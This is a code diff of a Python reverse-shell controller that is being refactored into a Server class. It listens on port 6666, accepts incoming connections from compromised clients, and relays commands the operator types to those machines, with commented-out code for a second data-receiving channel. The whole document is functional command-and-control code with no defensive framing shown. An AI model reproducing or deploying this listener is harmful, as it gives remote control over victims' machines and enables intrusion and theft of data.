@@ -7,109 +7,112 @@ import threading
 import os
 import platform
 
+class Server():
+    def __init__(self):
+        pass
 
-def clrscr():
-        if platform.system() == "Linux":
-            os.system("clear")
-        elif platform.system() == "Windows":
-            os.system("cls")
+    @staticmethod
+    def clrscr():
+            if platform.system() == "Linux":
+                os.system("clear")
+            elif platform.system() == "Windows":
+                os.system("cls")
 
-def incomingData(c, message):
-    quitting = False
-    while not quitting:
-        if message == "exit":
-            quitting = True
-            c.close()
-        else:
-            print(message)
-            message = c.recv(1024).decode('UTF-8')
-
-def incomingReverseShell(c, message, SEP):
-
-    quitting = False
-    # Premier receive donne le current working directory
-    cwd = c.recv(1024).decode('UTF-8')
-    while not quitting:
-
-        command = input(f"{cwd} $> ")
-        if not command.strip():
-            continue
-        elif command.lower() == "cls" or command.lower() == "clear":
-            clrscr()
-            continue
-        else:
-            c.send(bytes(command, "UTF-8"))
-            message = c.recv(1024).decode('UTF-8')
-        
-        if command.lower() == "exit":
-            quitting = True
-            c.close()
-        else:    
-            if len(message.split(SEP)) > 1:
-                message, cwd = message.split(SEP)
+    def incomingData(self, c, message):
+        quitting = False
+        while not quitting:
+            if message == "exit":
+                quitting = True
+                c.close()
             else:
-                cwd = message
-        print(message)
+                # TODO: Change print for DAO 
+                print(message)
+                message = c.recv(1024).decode('UTF-8')
 
-# Start two server Thread
-# Receiving Data
-# Receiving ReverseShell
-def server():
-    # [1]_ [2]_  
+    def incomingReverseShell(self, c, message, SEP):
 
- # Starting data
-    # c = None
-    # addr = None
-    # message = 'Waiting for connection'
-    # s = socket.socket()
-    # host = "0.0.0.0"
-    # port = 9999
-    # s.bind((host, port))
-    # s.listen(5)
+        quitting = False
+        # Premier receive donne le current working directory
+        cwd = c.recv(1024).decode('UTF-8')
+        while not quitting:
 
-    # while True:
-    #     c, addr = s.accept()
-    #     print('Got connection from', addr)
-    #     # On crée un thread receiving data
-    #     connection_handler = threading.Thread(
-    #         target=incomingData,
-    #         args=(c, message,)
-    #     )
-    #     connection_handler.start()
-    #     print("\n Nombre de Thread", threading.active_count())
- 
- # Starting Reverse Shell
-    c = None
-    addr = None
-    message = 'Waiting for connection'
-    SEP = "<sep>"
+            command = input(f"{cwd} $> ")
+            if not command.strip():
+                continue
+            elif command.lower() == "cls" or command.lower() == "clear":
+                self.clrscr()
+                continue
+            else:
+                c.send(bytes(command, "UTF-8"))
+                message = c.recv(1024).decode('UTF-8')
+            
+            if command.lower() == "exit":
+                quitting = True
+                c.close()
+            else:    
+                if len(message.split(SEP)) > 1:
+                    message, cwd = message.split(SEP)
+                else:
+                    cwd = message
+            print(message)
 
-    s = socket.socket()
 
-    host = "0.0.0.0"
-    port = 6666
+    def main(self):
+        # [1]_ [2]_  
 
-    s.bind((host, port))
-    s.listen(5)
+    # Starting data
+        # c = None
+        # addr = None
+        # message = 'Waiting for connection'
+        # s = socket.socket()
+        # host = "0.0.0.0"
+        # port = 9999
+        # s.bind((host, port))
+        # s.listen(5)
 
-    while True:
-        try:
-            c, addr = s.accept()
-            print('Got connection from', addr)
+        # while True:
+        #     c, addr = s.accept()
+        #     print('Got connection from', addr)
+        #     # On crée un thread receiving data
+        #     connection_handler = threading.Thread(
+        #         target=incomingData,
+        #         args=(c, message,)
+        #     )
+        #     connection_handler.start()
+        #     print("\n Nombre de Thread", threading.active_count())
+    
+    # Starting Reverse Shell
+        c = None
+        addr = None
+        message = 'Waiting for connection'
+        SEP = "<sep>"
 
-            # On crée un thread receiving data
-            connection_handler = threading.Thread(
-                target=incomingReverseShell,
-                args=(c, message, SEP,)
-            )
-            connection_handler.start()
-            print("\n Nombre de Thread", threading.active_count())
-        except socket.timeout:
-            continue
+        s = socket.socket()
+
+        host = "0.0.0.0"
+        port = 6666
+
+        s.bind((host, port))
+        s.listen(5)
+
+        while True:
+            try:
+                c, addr = s.accept()
+                print('Got connection from', addr)
+
+                # On crée un thread receiving data
+                connection_handler = threading.Thread(
+                    target=self.incomingReverseShell,
+                    args=(c, message, SEP,)
+                )
+                connection_handler.start()
+                print("\n Nombre de Thread", threading.active_count())
+            except socket.timeout:
+                continue
 
 
 if __name__ == "__main__":
-   server()
+   Server().main()
 
 
 '''
